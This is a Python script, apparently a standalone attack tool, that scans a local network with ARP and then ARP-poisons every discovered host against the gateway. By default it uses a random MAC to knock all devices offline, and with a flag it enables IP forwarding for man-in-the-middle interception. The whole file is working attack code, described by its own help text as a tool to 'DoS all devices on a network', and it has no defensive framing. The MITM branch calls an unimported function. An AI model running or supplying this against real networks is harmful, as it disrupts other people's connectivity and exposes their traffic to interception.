import argparse, random, socket, sys, time, os
try:
    from scapy.all import Ether, srp, conf, ARP, send
except ImportError:
    print("Scapy could not be imported.")
    print("Make sure to 'pip3 install scapy'")
    sys.exit(0)


# Global variables
myIP = socket.gethostbyname(socket.gethostname())
conf.verb=0
exceptions = []

# Checks for arguments and privileges
def checks():
    # Check OS
    if sys.platform.lower() != "linux":
        print("This script only works in Linux!")
        sys.exit(0)

    # Check root
    if os.getuid() != 0:
        print("Must run as root!")
        sys.exit(0)

    # Check interface
    if not args.interface:
        print("No interface given. Exiting...")
        sys.exit(0)

    # Check network
    if not args.network:
        print("No network given. Exiting...")
        sys.exit(0)

    # Check gateway
    if not args.gateway:
        print("No gateway given. Exiting...")
        sys.exit(0)

    # Check exceptions
    if args.file:
        getExceptions(args.file)

# Gets MAC from IP
def getMAC(ip, interface):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface, inter=0.2)

    for snd, rcv in ans:
        MAC = rcv.sprintf(r"%Ether.src%") 

    return MAC

# Generates a random MAC
def randomMac():
    generated = ""
    for i in range(0,6):
        generated += ":" + hex(random.randint(0,255))[2:]

    return generated[1:]

def enableForwarding():
    print("Enabling IP forwarding for MITM...")
    result = os.system("sysctl -w net.ipv4.ip_forward=1")
    if result ==0:
        print("Done")
    else:
        print("An error ocurred enabling IP forwarding")
        sys.exit(0)

def disableForwarding():
    print("Disabling IP forwarding...")
    result = os.system("sysctl -w net.ipv4.ip_forward=0")
    if result ==0:
        print("Done")
    else:
        print("An error ocurred disabling IP forwarding")
        sys.exit(0)

# Returns a list with all IPs on the network
def scan(network, interface):
    try:
        print(f"Scanning {network} on {interface}...")
        ips = {}
        # Send ARP queries    
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = network), timeout=2, iface=interface, inter=0.1)
        # Get responses
        print("Found hosts:")
        for snd, rcv in ans:
            print(rcv.sprintf(r"%Ether.src% - %ARP.psrc%"))
            ips[rcv.sprintf(r"%ARP.psrc%")] = rcv.sprintf(r"%Ether.src%")

        print("")
        return erase(ips, exceptions)
    except KeyboardInterrupt:
        print("User interrupt. Exitting...")
        sys.exit(0)

# Get all IPs from the exceptions file
def getExceptions(file):
    try:
        lines = open(file)
        for line in lines.readlines():
            exceptions.append(line.rstrip())

        lines.close()

    except FileNotFoundError:
        print(f"The file {file} couldn't be found")

# Erases exceptions from the list of victims (also deletes your IP)
def erase(ips, exceptions):
    # Delete your IP so you may have Internet
    if myIP in ips:
        del ips[myIP]
    
    # If provided, deletes all exceptions from the list of victims
    if len(exceptions) != 0:
        for IP in exceptions:    
            if IP in ips:        
                del ips[IP]

    return ips


# ARP poison victims
def arp_poison(gateway_ip, target_ips):
    print("Starting attack... [Ctrl+C to stop]")
    try:      
        gateway_mac = target_ips[gateway_ip]
        while True:
            for target_ip in target_ips:
                if target_ip != gateway_ip:                
                    target_mac = target_ips[target_ip]
                    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=MAC))
                    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=MAC))
    except KeyboardInterrupt:
        print("Attack interrupted. Restoring network...")
        restoreNetwork(gateway_ip, target_ips)

# Restores network broadcasting ARP replies with correct MAC and IP
def restoreNetwork(gateway_ip, target_ips):
    gateway_mac = target_ips[gateway_ip]
    for target_ip in target_ips:
        target_mac = target_ips[target_ip]
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=20)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=20)
    print("Network restored")
    

# Parse args
DESCRIPTION = "a command line tool to DoS all devices on a network (except yourself :D)"
parser = argparse.ArgumentParser(description=DESCRIPTION)
parser.add_argument("-i", "--interface", help="Interface to use")
parser.add_argument("-n", "--network", help="Network to DoS")
parser.add_argument("-g", "--gateway", help="Gateway IP")
parser.add_argument("-f", "--file", help="List of IPs to exclude from the attack (one per line)")
parser.add_argument("-m", "--mitm", action="store_true", help="Use MITM instead")
args = parser.parse_args()

#Run checks
checks()

interface = args.interface
network = args.network
gateway = args.gateway

try:
    # Get my own MAC for MITM, or use random one for DoS
    if args.mitm:
        MAC = get_if_hwaddr(interface)
        enableForwarding()
    else:
        MAC = randomMac()
    target_ips = scan(network, interface)
    arp_poison(gateway, target_ips)
except KeyboardInterrupt:
    print("User interrupt. Exiting...")

if args.mitm:
    disableForwarding()

